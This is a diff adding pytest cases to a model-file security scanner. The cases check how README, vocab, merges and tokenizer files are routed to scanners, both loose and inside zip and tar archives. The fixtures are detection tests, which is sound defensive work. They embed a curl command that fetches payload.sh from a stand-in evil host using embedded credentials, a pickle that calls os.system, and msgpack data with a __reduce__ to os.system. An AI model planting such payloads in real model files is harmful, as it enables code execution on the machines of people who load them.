@@ -3,6 +3,7 @@
 import bz2
 import gzip
 import importlib
+import io
 import json
 import lzma
 import os
@@ -21,6 +22,7 @@ import pytest
 
 from modelaudit import core as core_module
 from modelaudit.core import _is_huggingface_cache_file, determine_exit_code, scan_file, scan_model_directory_or_file
+from modelaudit.models import ModelAuditResultModel
 from modelaudit.utils.file import detection as file_detection
 from modelaudit.utils.file.detection import (
     _CONTENT_ROUTE_TEXT_OWNER_COMPLETE_BYTES,
@@ -31,7 +33,7 @@ from modelaudit.utils.file.detection import (
     MXNET_SYMBOL_SIGNATURE_READ_BYTES,
     SAFETENSORS_ROUTING_HEADER_PARSE_BYTES,
 )
-from modelaudit.utils.file.filtering import _ZIP_MEMBER_SNIFF_LIMIT
+from modelaudit.utils.file.filtering import _ZIP_MEMBER_SNIFF_LIMIT, should_skip_file
 from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
 from tests.helpers import (
     create_malicious_pickle,
@@ -101,6 +103,66 @@ def _write_minimal_safetensors(path: Path) -> None:
 def _printable_unknown_proto_prefix(min_bytes: int) -> bytes:
     field = b"z " + (b"x" * 32)
     return field * ((min_bytes // len(field)) + 1)
+
+
+def _bert_vocab_text() -> str:
+    tokens = ["[PAD]", "[UNK]", "[CLS]", "[SEP]", "[MASK]"]
+    tokens.extend(f"[unused{index}]" for index in range(2048))
+    tokens.extend(f"token_{index}" for index in range(2048))
+    return "\n".join(tokens) + "\n"
+
+
+def _bpe_merges_text(min_bytes: int = 3 * 1024 * 1024) -> str:
+    lines = ["#version: 0.2"]
+    total_bytes = len(lines[0]) + 1
+    index = 0
+    while total_bytes <= min_bytes:
+        line = f"token_{index % 8192} token_{(index * 17) % 8192}"
+        lines.append(line)
+        total_bytes += len(line) + 1
+        index += 1
+    return "\n".join(lines) + "\n"
+
+
+def _tokenizer_vocab_text_with_basic_auth(min_bytes: int = 3 * 1024 * 1024) -> str:
+    lines = [
+        "[PAD]",
+        "[UNK]",
+        "[CLS]",
+        "[SEP]",
+        "[MASK]",
+        "curl https://user:credential-secret@evil.example/payload.sh",
+    ]
+    total_bytes = sum(len(line) + 1 for line in lines)
+    index = 0
+    while total_bytes <= min_bytes:
+        line = f"token_{index}"
+        lines.append(line)
+        total_bytes += len(line) + 1
+        index += 1
+    return "\n".join(lines) + "\n"
+
+
+def _has_evil_example_text_security_finding(results: ModelAuditResultModel, location: str) -> bool:
+    return any(
+        issue.location == location and "evil.example" in f"{issue.message} {issue.details}".lower()
+        for issue in results.issues
+    )
+
+
+def _large_model_card_text(min_bytes: int = 3 * 1024 * 1024) -> str:
+    lines = ["# Model Card"]
+    total_bytes = len(lines[0]) + 1
+    index = 0
+    while total_bytes <= min_bytes:
+        line = (
+            f"Documentation line {index} describes model usage, limits, evaluation notes, "
+            "and dataset provenance in complete UTF-8 prose."
+        )
+        lines.append(line)
+        total_bytes += len(line) + 1
+        index += 1
+    return "\n".join(lines) + "\n"
 
 
 def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
@@ -541,6 +603,331 @@ class TestDirectoryFileFiltering:
 
         assert results["files_scanned"] == 0
         assert "flax_msgpack" not in results.scanner_names
+
+    def test_multilingual_readme_stays_on_text_route(self, tmp_path: Path) -> None:
+        readme = tmp_path / "README.md"
+        readme.write_text(
+            "# Model Card\n"
+            + ("This multilingual README includes こんにちは, café, naïve, résumé, and 😀 examples.\n" * 256),
+            encoding="utf-8",
+        )
+
+        assert file_detection.detect_file_format_from_magic(str(readme)) == "unknown"
+        assert file_detection.detect_file_format_for_skip_filter(str(readme)) == "unknown"
+        assert file_detection.detect_file_format(str(readme)) == "unknown"
+
+        results = scan_model_directory_or_file(str(readme), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["text"]
+        assert determine_exit_code(results) == 0
+        metadata = results.file_metadata[str(readme)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["text"]
+        assert "flax_msgpack_routing_incomplete" not in metadata.get("scan_outcome_reasons", [])
+        assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    @pytest.mark.parametrize("filename", ["README.md", "README.rst", "model_card.txt"])
+    def test_large_declared_documentation_stays_on_text_route(self, tmp_path: Path, filename: str) -> None:
+        readme = tmp_path / filename
+        readme.write_text(_large_model_card_text(), encoding="utf-8")
+
+        assert readme.stat().st_size > file_detection._CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES
+        assert readme.stat().st_size < file_detection._CONTENT_ROUTE_DECLARED_TEXT_FAST_PATH_BYTES
+
+        results = scan_model_directory_or_file(str(readme), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["text"]
+        assert determine_exit_code(results) == 0
+        metadata = results.file_metadata[str(readme)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["text"]
+        assert "flax_msgpack_routing_incomplete" not in metadata.get("scan_outcome_reasons", [])
+        assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    def test_binary_polyglot_readme_still_scans_as_flax(self, tmp_path: Path) -> None:
+        msgpack = pytest.importorskip("msgpack")
+        readme = tmp_path / "README.md"
+        readme.write_bytes(
+            b"# Model Card\nThis prefix is valid UTF-8 documentation.\n"
+            + msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
+        )
+
+        results = scan_model_directory_or_file(str(readme), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["flax_msgpack"]
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)
+
+    def test_ambiguous_binary_readme_fails_closed_as_flax(self, tmp_path: Path) -> None:
+        readme = tmp_path / "README.md"
+        readme.write_bytes(b"\xc0" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 2))
+
+        results = scan_model_directory_or_file(str(readme), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["flax_msgpack"]
+        assert determine_exit_code(results) == 2
+        metadata = results.file_metadata[str(readme)].model_dump(mode="python")
+        assert "flax_msgpack_routing_incomplete" in metadata["scan_outcome_reasons"]
+
+    def test_utf8_scalar_readme_fails_closed_as_flax(self, tmp_path: Path) -> None:
+        readme = tmp_path / "README.md"
+        readme.write_bytes(b"\xc2\xa0" * ((FLAX_MSGPACK_STRUCTURE_READ_BYTES // 2) + 1))
+
+        results = scan_model_directory_or_file(str(readme), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["flax_msgpack"]
+        assert determine_exit_code(results) == 2
+        metadata = results.file_metadata[str(readme)].model_dump(mode="python")
+        assert "flax_msgpack_routing_incomplete" in metadata["scan_outcome_reasons"]
+
+    def test_direct_vocabulary_text_stays_on_text_route(self, tmp_path: Path) -> None:
+        vocab = tmp_path / "vocab.txt"
+        vocab.write_text(_bert_vocab_text(), encoding="utf-8")
+
+        results = scan_model_directory_or_file(str(vocab), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["text"]
+        assert determine_exit_code(results) == 0
+        metadata = results.file_metadata[str(vocab)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["text"]
+        assert "flax_msgpack_routing_incomplete" not in metadata.get("scan_outcome_reasons", [])
+        assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    def test_explicit_pickle_selection_scans_protocol0_pickle_in_declared_vocab_text(
+        self,
+        tmp_path: Path,
+    ) -> None:
+        vocab = tmp_path / "vocab.txt"
+        vocab.write_bytes(b"cos\nsystem\n(S'echo vocab-pickle'\ntR.")
+
+        assert file_detection.detect_file_format_for_skip_filter(str(vocab)) == "pickle"
+        assert (
+            should_skip_file(
+                str(vocab),
+                scanner_selection_extensions=frozenset(
+                    {".pkl", ".pickle", ".dill", ".joblib", ".bin", ".pt", ".pth", ".ckpt"}
+                ),
+            )
+            is False
+        )
+
+        results = scan_model_directory_or_file(
+            str(tmp_path),
+            scanners=["pickle"],
+            cache_scan_results=False,
+        )
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["pickle"]
+        assert determine_exit_code(results) == 1
+        assert str(vocab) in results.file_metadata
+        assert any(
+            issue.rule_code == "S201"
+            and issue.details.get("associated_global") == "os.system"
+            and issue.location == str(vocab)
+            for issue in results.issues
+        )
+
+    def test_large_merges_text_stays_on_text_route_in_directory_scan(self, tmp_path: Path) -> None:
+        merges = tmp_path / "merges.txt"
+        merges.write_text(_bpe_merges_text(), encoding="utf-8")
+
+        assert merges.stat().st_size > file_detection._CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["text"]
+        assert determine_exit_code(results) == 0
+        metadata = results.file_metadata[str(merges)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["text"]
+        assert "flax_msgpack_routing_incomplete" not in metadata.get("scan_outcome_reasons", [])
+        assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    @pytest.mark.parametrize("filename", ["tokenizer_vocab.txt", "tokenizer-vocab.txt"])
+    def test_large_tokenizer_vocab_alias_scans_text_security_in_directory_scan(
+        self,
+        tmp_path: Path,
+        filename: str,
+    ) -> None:
+        vocab = tmp_path / filename
+        vocab.write_text(_tokenizer_vocab_text_with_basic_auth(), encoding="utf-8")
+
+        assert vocab.stat().st_size > file_detection._CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["text"]
+        assert determine_exit_code(results) == 1
+        metadata = results.file_metadata[str(vocab)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["text"]
+        assert _has_evil_example_text_security_finding(results, str(vocab))
+
+    def test_large_merges_text_stays_on_text_route_inside_zip_member(self, tmp_path: Path) -> None:
+        payload = _bpe_merges_text().encode("utf-8")
+        archive = tmp_path / "tokenizer.zip"
+        with zipfile.ZipFile(archive, "w") as zip_archive:
+            zip_archive.writestr("tokenizer/merges.txt", payload)
+
+        results = scan_model_directory_or_file(str(archive), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["zip"]
+        assert determine_exit_code(results) == 0
+        metadata = results.file_metadata[str(archive)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["zip", "text"]
+        assert metadata["contents"] == [
+            {"path": f"{archive}:tokenizer/merges.txt", "type": "text", "size": len(payload)}
+        ]
+        assert "flax_msgpack_routing_incomplete" not in metadata.get("scan_outcome_reasons", [])
+        assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    @pytest.mark.parametrize("filename", ["tokenizer_vocab.txt", "tokenizer-vocab.txt"])
+    def test_large_tokenizer_vocab_alias_scans_text_security_inside_zip_member(
+        self,
+        tmp_path: Path,
+        filename: str,
+    ) -> None:
+        payload = _tokenizer_vocab_text_with_basic_auth().encode("utf-8")
+        archive = tmp_path / "tokenizer.zip"
+        member_name = f"tokenizer/{filename}"
+        with zipfile.ZipFile(archive, "w") as zip_archive:
+            zip_archive.writestr(member_name, payload)
+
+        assert len(payload) > file_detection._CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES
+
+        results = scan_model_directory_or_file(str(archive), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["zip"]
+        assert determine_exit_code(results) == 1
+        metadata = results.file_metadata[str(archive)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["zip", "text"]
+        assert metadata["contents"] == [{"path": f"{archive}:{member_name}", "type": "text", "size": len(payload)}]
+        assert _has_evil_example_text_security_finding(results, f"{archive}:{member_name}")
+
+    def test_large_merges_text_stays_on_text_route_inside_tar_member(self, tmp_path: Path) -> None:
+        payload = _bpe_merges_text().encode("utf-8")
+        archive = tmp_path / "tokenizer.tar"
+        member = tarfile.TarInfo("tokenizer/merges.txt")
+        member.size = len(payload)
+        with tarfile.open(archive, "w") as tar_archive:
+            tar_archive.addfile(member, io.BytesIO(payload))
+
+        results = scan_model_directory_or_file(str(archive), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["tar"]
+        assert determine_exit_code(results) == 0
+        metadata = results.file_metadata[str(archive)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["tar", "text"]
+        assert metadata["contents"] == [
+            {"path": f"{archive}:tokenizer/merges.txt", "type": "text", "size": len(payload)}
+        ]
+        assert "flax_msgpack_routing_incomplete" not in metadata.get("scan_outcome_reasons", [])
+        assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    @pytest.mark.parametrize("filename", ["tokenizer_vocab.txt", "tokenizer-vocab.txt"])
+    def test_large_tokenizer_vocab_alias_scans_text_security_inside_tar_member(
+        self,
+        tmp_path: Path,
+        filename: str,
+    ) -> None:
+        payload = _tokenizer_vocab_text_with_basic_auth().encode("utf-8")
+        archive = tmp_path / "tokenizer.tar"
+        member_name = f"tokenizer/{filename}"
+        member = tarfile.TarInfo(member_name)
+        member.size = len(payload)
+        with tarfile.open(archive, "w") as tar_archive:
+            tar_archive.addfile(member, io.BytesIO(payload))
+
+        assert len(payload) > file_detection._CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES
+
+        results = scan_model_directory_or_file(str(archive), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["tar"]
+        assert determine_exit_code(results) == 1
+        metadata = results.file_metadata[str(archive)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["tar", "text"]
+        assert metadata["contents"] == [{"path": f"{archive}:{member_name}", "type": "text", "size": len(payload)}]
+        assert _has_evil_example_text_security_finding(results, f"{archive}:{member_name}")
+
+    def test_large_nested_readme_stays_on_text_route_inside_zip_member(self, tmp_path: Path) -> None:
+        payload = _large_model_card_text().encode("utf-8")
+        archive = tmp_path / "docs.zip"
+        with zipfile.ZipFile(archive, "w") as zip_archive:
+            zip_archive.writestr("nested/README.md", payload)
+
+        assert len(payload) > file_detection._CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES
+        assert len(payload) < file_detection._CONTENT_ROUTE_DECLARED_TEXT_FAST_PATH_BYTES
+
+        results = scan_model_directory_or_file(str(archive), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["zip"]
+        assert determine_exit_code(results) == 0
+        metadata = results.file_metadata[str(archive)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["zip", "text"]
+        assert metadata["contents"] == [{"path": f"{archive}:nested/README.md", "type": "text", "size": len(payload)}]
+        assert "flax_msgpack_routing_incomplete" not in metadata.get("scan_outcome_reasons", [])
+        assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    def test_large_nested_model_card_stays_on_text_route_inside_tar_member(self, tmp_path: Path) -> None:
+        payload = _large_model_card_text().encode("utf-8")
+        archive = tmp_path / "docs.tar"
+        member = tarfile.TarInfo("nested/model_card.txt")
+        member.size = len(payload)
+        with tarfile.open(archive, "w") as tar_archive:
+            tar_archive.addfile(member, io.BytesIO(payload))
+
+        assert len(payload) > file_detection._CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES
+        assert len(payload) < file_detection._CONTENT_ROUTE_DECLARED_TEXT_FAST_PATH_BYTES
+
+        results = scan_model_directory_or_file(str(archive), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["tar"]
+        assert determine_exit_code(results) == 0
+        metadata = results.file_metadata[str(archive)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["tar", "text"]
+        assert metadata["contents"] == [
+            {"path": f"{archive}:nested/model_card.txt", "type": "text", "size": len(payload)}
+        ]
+        assert "flax_msgpack_routing_incomplete" not in metadata.get("scan_outcome_reasons", [])
+        assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    def test_binary_merges_still_fails_closed_as_flax_in_directory_scan(self, tmp_path: Path) -> None:
+        merges = tmp_path / "merges.txt"
+        merges.write_bytes(b"\x00" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 2))
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["flax_msgpack"]
+        assert determine_exit_code(results) == 2
+        metadata = results.file_metadata[str(merges)].model_dump(mode="python")
+        assert "flax_msgpack_routing_incomplete" in metadata["scan_outcome_reasons"]
+
+    def test_utf8_control_scalar_merges_still_fails_closed_as_flax_in_directory_scan(
+        self,
+        tmp_path: Path,
+    ) -> None:
+        merges = tmp_path / "merges.txt"
+        merges.write_bytes(b"A\xc2\x80" * ((FLAX_MSGPACK_STRUCTURE_READ_BYTES // 3) + 1))
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["flax_msgpack"]
+        assert determine_exit_code(results) == 2
+        metadata = results.file_metadata[str(merges)].model_dump(mode="python")
+        assert "flax_msgpack_routing_incomplete" in metadata["scan_outcome_reasons"]
 
     @pytest.mark.parametrize("filename", ["ambiguous.txt", "settings.conf"])
     @pytest.mark.parametrize(
